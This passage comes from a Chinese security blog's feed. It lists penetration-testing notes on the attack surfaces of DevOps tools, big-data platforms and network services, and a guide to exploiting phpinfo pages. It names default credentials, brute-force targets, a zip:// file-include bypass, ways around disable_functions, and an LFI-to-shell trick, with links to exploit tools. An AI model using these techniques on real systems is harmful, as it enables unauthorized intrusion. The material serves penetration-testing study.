class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>

































]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（二）渗透技巧—常见运维系统</title>
    <url>/2019/04/15/%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E8%BF%90%E7%BB%B4%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。<br>内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p>
<h3 id="1、Gitlab"><a href="#1、Gitlab" class="headerlink" title="1、Gitlab"></a>1、Gitlab</h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意文件读取漏洞</span><br><span class="line">•   意用户 token 泄露漏洞</span><br><span class="line">•   命令执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</span><br><span class="line"></span><br><span class="line">http://rinige.com/index.php/archives/577/</span><br></pre></td></tr></table></figure>
<h3 id="2、Jenkins"><a href="#2、Jenkins" class="headerlink" title="2、Jenkins"></a>2、Jenkins</h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   未授权访问漏洞</span><br><span class="line">•   登录入口爆破</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.cnblogs.com/backlion/p/6813260.html</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/86018</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/199/</span><br></pre></td></tr></table></figure>
<h3 id="3、Puppet"><a href="#3、Puppet" class="headerlink" title="3、Puppet"></a>3、Puppet</h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   可利用漏洞，很少公开的POC</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程命令执行</span><br></pre></td></tr></table></figure>
<h3 id="4、Ansible"><a href="#4、Ansible" class="headerlink" title="4、Ansible"></a>4、Ansible</h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行</span><br></pre></td></tr></table></figure>
<h3 id="5、Nagios"><a href="#5、Nagios" class="headerlink" title="5、Nagios"></a>5、Nagios</h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   代码执行</span><br><span class="line">•   SQLi</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.bugku.com/thread-87-1-1.html</span><br><span class="line">http://www.mottoin.com/93936.html</span><br></pre></td></tr></table></figure>
<h3 id="6、Zabbix"><a href="#6、Zabbix" class="headerlink" title="6、Zabbix"></a>6、Zabbix</h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞（具体参考 ExploitDB）：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   shell 命令注入</span><br><span class="line">•   认证绕过</span><br><span class="line">•   默认账户与密码，默认口令 admin/zabbix，或者是guest/空</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://blog.csdn.net/ytuo1223/article/details/45937981</span><br><span class="line"></span><br><span class="line">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/87570.html</span><br></pre></td></tr></table></figure>
<h3 id="7、Cacit"><a href="#7、Cacit" class="headerlink" title="7、Cacit"></a>7、Cacit</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   登录爆破</span><br><span class="line">•   默认密码admin/admin</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</span><br></pre></td></tr></table></figure>
<h3 id="8、Splunk"><a href="#8、Splunk" class="headerlink" title="8、Splunk"></a>8、Splunk</h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   信息泄露</span><br><span class="line">•   命令注入</span><br><span class="line">•   服务端请求伪造</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">ExploitDB 搜索</span><br></pre></td></tr></table></figure>

























]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（六）渗透技巧—大数据</title>
    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>




























]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（四）渗透技巧—常见服务、协议</title>
    <url>/2019/04/15/%EF%BC%88%E5%9B%9B%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E3%80%81%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、FTP-服务"><a href="#1、FTP-服务" class="headerlink" title="1、FTP 服务"></a>1、FTP 服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</span><br><span class="line">•   匿名访问：用户名：anonymous 密码：为空或任意邮箱</span><br><span class="line">•   嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</span><br><span class="line">•   后门 vsftp</span><br><span class="line">•   远程溢出</span><br><span class="line">•   跳转攻击</span><br></pre></td></tr></table></figure>
<h3 id="2、NFS-服务"><a href="#2、NFS-服务" class="headerlink" title="2、NFS 服务"></a>2、NFS 服务</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•未授权访问</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/articles/network/159468.html</span><br><span class="line"></span><br><span class="line">http://www.vuln.cn/6368</span><br></pre></td></tr></table></figure>
<h3 id="3、Samba服务"><a href="#3、Samba服务" class="headerlink" title="3、Samba服务"></a>3、Samba服务</h3><p>Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   弱口令</span><br><span class="line">•   未授权访问（public）</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.91ri.org/17114.html</span><br></pre></td></tr></table></figure>
<h3 id="4、SSH-服务"><a href="#4、SSH-服务" class="headerlink" title="4、SSH 服务"></a>4、SSH 服务</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：22</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   后门</span><br><span class="line">•   漏洞：28退格漏洞、OpenSSL漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://cloud.tencent.com/developer/article/1078187</span><br></pre></td></tr></table></figure>
<h3 id="5、Telnet-服务"><a href="#5、Telnet-服务" class="headerlink" title="5、Telnet 服务"></a>5、Telnet 服务</h3><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。<br>終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：21</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   嗅探</span><br></pre></td></tr></table></figure>
<h3 id="6、Windows-远程连接（rdp）"><a href="#6、Windows-远程连接（rdp）" class="headerlink" title="6、Windows 远程连接（rdp）"></a>6、Windows 远程连接（rdp）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：3389</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破</span><br><span class="line">•   Shift粘滞键后门：5次shift后门</span><br><span class="line">•   利用ms12-020攻击3389端口</span><br><span class="line">•   CVE-2019-0708</span><br></pre></td></tr></table></figure>
<h3 id="7、VNC服务"><a href="#7、VNC服务" class="headerlink" title="7、VNC服务"></a>7、VNC服务</h3><p>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：</span><br><span class="line">5900+桌面ID（5901；5902）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   认证口令绕过：</span><br><span class="line">•   拒绝服务攻击：（CVE-2015-5239）</span><br><span class="line">•   权限提升：（CVE-2013-6886）</span><br></pre></td></tr></table></figure>
<h3 id="8、SMTP协议"><a href="#8、SMTP协议" class="headerlink" title="8、SMTP协议"></a>8、SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：25（smtp）、465（smtps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
<h3 id="9、POP3协议"><a href="#9、POP3协议" class="headerlink" title="9、POP3协议"></a>9、POP3协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：109（POP2）、110（POP3）、995（POP3S）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破；弱口令</span><br><span class="line">•   未授权访问</span><br></pre></td></tr></table></figure>
<h3 id="10、DNS服务"><a href="#10、DNS服务" class="headerlink" title="10、DNS服务"></a>10、DNS服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：53</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   区域传输漏洞</span><br></pre></td></tr></table></figure>
<h3 id="11、IMAP协议"><a href="#11、IMAP协议" class="headerlink" title="11、IMAP协议"></a>11、IMAP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：143（imap）、993（imaps）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   配置不当</span><br></pre></td></tr></table></figure>
<h3 id="12、SNMP协议"><a href="#12、SNMP协议" class="headerlink" title="12、SNMP协议"></a>12、SNMP协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：161</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   爆破：弱口令</span><br></pre></td></tr></table></figure>
<h3 id="13、DHCP服务"><a href="#13、DHCP服务" class="headerlink" title="13、DHCP服务"></a>13、DHCP服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：67&amp;68、546（DHCP Failover做双机热备的）</span><br><span class="line"></span><br><span class="line">攻击方式：</span><br><span class="line">•   DHCP劫持</span><br></pre></td></tr></table></figure>





















]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>phpinfo正确食用方式</title>
    <url>/2019/03/18/phpinfo%E6%AD%A3%E7%A1%AE%E9%A3%9F%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>在我们平时的渗透、ctf的过程中，或多或少会碰到phpinfo页面。但是这个页面包含的信息太多，常常感觉无从下手，在这里总结一下，可能没有那么全面。</p><a id="more"></a>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><h3 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h3><p><img src="https://i.loli.net/2019/11/11/Rj47CQgI6SJwEHB.png" alt="20190226215040.png"><br>这是最基本的，php更新速度非常快，各版本都有一些小特性。<br><a href="http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html</a><br><img src="https://i.loli.net/2019/11/11/9E25qCF3QLiufkY.png" alt="20190226215142.png"></p>
<h3 id="SYSTEM-INFO"><a href="#SYSTEM-INFO" class="headerlink" title="SYSTEM INFO"></a>SYSTEM INFO</h3><p><img src="https://i.loli.net/2019/11/11/vkIrC6tALWQlJHb.png" alt="he8ch44f3e.png"><br>详细的操作系统信息，为提权做准备</p>
<h3 id="SERVER-API"><a href="#SERVER-API" class="headerlink" title="SERVER API"></a>SERVER API</h3><p><img src="https://i.loli.net/2019/11/11/AVCN4EcZI9Wdf26.png" alt="20190226221734.png"><br>php解释器与应用层的桥梁。</p>
<p>1、FPM/FastCGI 多用于和nginx通信，当然也可用于其他web中间件。<br>Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写<br><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a><br>2、Apache 2.0 Handler php为apache提供的专用SAPI<br>3、Command Line Interface php命令行<br>4、CGI/FastCGI 碰见的几次都是用于iis</p>
<h3 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h3><p><img src="https://i.loli.net/2019/11/11/ckDnU3iNVtXwTHI.png" alt="20190226220548.png"><br>某些情况下可以加载自己的扩展。</p>
<h3 id="REGISTERED-PHP-STREAMS-AND-FILTERS"><a href="#REGISTERED-PHP-STREAMS-AND-FILTERS" class="headerlink" title="REGISTERED PHP STREAMS AND FILTERS"></a>REGISTERED PHP STREAMS AND FILTERS</h3><p>常见的就不说了。</p>
<p>1、phar<br>利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php<br>phar反序列化<br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p>2、gopher<br>利用 Gopher 协议拓展攻击面<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
<p>3、dict<br>探测为主</p>
<p><img src="https://i.loli.net/2019/11/11/tinOWDju5Yl2vAH.png" alt="20190226233652.png"></p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
<h2 id="核心配置"><a href="#核心配置" class="headerlink" title="核心配置"></a>核心配置</h2><h3 id="EXTENSION-DIR"><a href="#EXTENSION-DIR" class="headerlink" title="EXTENSION_DIR"></a>EXTENSION_DIR</h3><p><img src="https://i.loli.net/2019/11/11/E9e56f2YcrSCjQV.png" alt="bjlfkkafag.png"><br>php扩展的路径</p>
<h3 id="ALLOW-URL-INCLUDE"><a href="#ALLOW-URL-INCLUDE" class="headerlink" title="ALLOW_URL_INCLUDE"></a>ALLOW_URL_INCLUDE</h3><p>远程文件包含，但是一般不会开启</p>
<h3 id="ASP-TAGS"><a href="#ASP-TAGS" class="headerlink" title="ASP_TAGS"></a>ASP_TAGS</h3><p><img src="https://i.loli.net/2019/11/11/XqBV1DGndP8SKwy.png" alt="0g7c7mmj2i.png"></p>
<p>php标签有4种形式，如果这个选项不开启的话，使用asp的标签是不会解析的。<br>当<?php ?>标签被过滤时，可以通过.user.ini来覆盖php.ini中的配置。.user.ini在nginx等其他web中间件中也是有效的，应用范围比.htaccess广。<br>注意： 在PHP 7已经完全移除了这种标签</p>
<h3 id="SHORT-OPEN-TAG"><a href="#SHORT-OPEN-TAG" class="headerlink" title="SHORT_OPEN_TAG"></a>SHORT_OPEN_TAG</h3><p><img src="https://i.loli.net/2019/11/11/Q18x63hjgnSpU7w.png" alt="h4bgafaced.png"></p>
<p>还是标签的问题，允许<??>这种形式，并且&lt;?=等价于&lt;? echo</p>
<h3 id="DISABLE-FUNCTIONS"><a href="#DISABLE-FUNCTIONS" class="headerlink" title="DISABLE_FUNCTIONS"></a>DISABLE_FUNCTIONS</h3><p><img src="https://i.loli.net/2019/11/11/3xgjStRcmovGLHW.png" alt="mf8ekjh0mj.png"></p>
<p>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。<br>绕过的方式有这么几个：</p>
<p>1、黑名单绕过：<br>百密一疏，寻找黑名单中漏掉的函数，上图中禁用的函数算是比较全的了。<br>比如在编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。</p>
<p>2、利用扩展（如ImageMagick）绕过<br>利用ImageMagick漏洞绕过disable_function</p>
<p>3、利用环境变量LD_PRELOAD来绕过<br>利用环境变量LD_PRELOAD来绕过php disable_function<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>4、利用扩展库绕过<br><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">http://www.91ri.org/8700.html</a><br>一个综合：<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>
<h3 id="ENABLE-DL"><a href="#ENABLE-DL" class="headerlink" title="ENABLE_DL"></a>ENABLE_DL</h3><p><img src="https://i.loli.net/2019/11/11/bNoQGzyewhmlJSV.png" alt="8k74aidbj9.png"><br>上面说的利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项</p>
<h3 id="MAGIC-QUOTES-GPC"><a href="#MAGIC-QUOTES-GPC" class="headerlink" title="MAGIC_QUOTES_GPC"></a>MAGIC_QUOTES_GPC</h3><p><img src="https://i.loli.net/2019/11/11/Bi4fhpxmgIRNJA2.png" alt="f7ec27jdde.png"><br>这个就不用多说了吧</p>
<h3 id="OPEN-BASEDIR"><a href="#OPEN-BASEDIR" class="headerlink" title="OPEN_BASEDIR"></a>OPEN_BASEDIR</h3><p><img src="https://i.loli.net/2019/11/11/H6lsyFAWvepZg51.png" alt="cd2e9khhfh.png"><br>这个参数将用户可操作的文件限制在某目录下，但是这个限制是可以绕过的。</p>
<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
<p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a></p>
<p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">绕过open_basedir读文件脚本</a></p>
<h3 id="PHP-VARIABLES"><a href="#PHP-VARIABLES" class="headerlink" title="PHP VARIABLES"></a>PHP VARIABLES</h3><p>真实IP</p>
<p><img src="https://i.loli.net/2019/11/11/6fU9gDMBptNsFuZ.png" alt="20190228104758.png"><br><img src="https://i.loli.net/2019/11/11/loGXckW3xfrBgsA.png" alt="20190228104923.png"></p>
<p>cdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。</p>
<p>当网站使用了nginx反向代理时，如果反代服务器和web服务器在同一内网，这个值可能会是内网ip。</p>
<p>当网站在docker中运行时，这个值会是宿主机docker网卡上的ip。</p>
<h3 id="WEB根目录"><a href="#WEB根目录" class="headerlink" title="WEB根目录"></a>WEB根目录</h3><p><img src="https://i.loli.net/2019/11/11/wilgIo9VK6Nvy3D.png" alt="20190228105655.png"></p>
<p>$_SERVER[‘DOCUMENT_ROOT’]可能会有偏差。</p>
<h3 id="临时文件路径"><a href="#临时文件路径" class="headerlink" title="临时文件路径"></a>临时文件路径</h3><p>向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。<br><img src="https://i.loli.net/2019/11/11/5sIoVtyWTAjqMYO.png" alt="81ach81k8j.png"><br><a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo" target="_blank" rel="noopener">https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo</a></p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="IMAGICK"><a href="#IMAGICK" class="headerlink" title="IMAGICK"></a>IMAGICK</h3><p>前段时间影响比较大的漏洞，注意看版本。<br>漏洞影响ImageMagick 6.9.3-10之前的版本，包括ubuntu源中安装的ImageMagick。</p>
<p><a href="http://blog.topsec.com.cn/imagemagick-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e5%8f%8a%e5%88%86%e6%9e%90/" target="_blank" rel="noopener">ImageMagick 漏洞利用方式及分析</a></p>
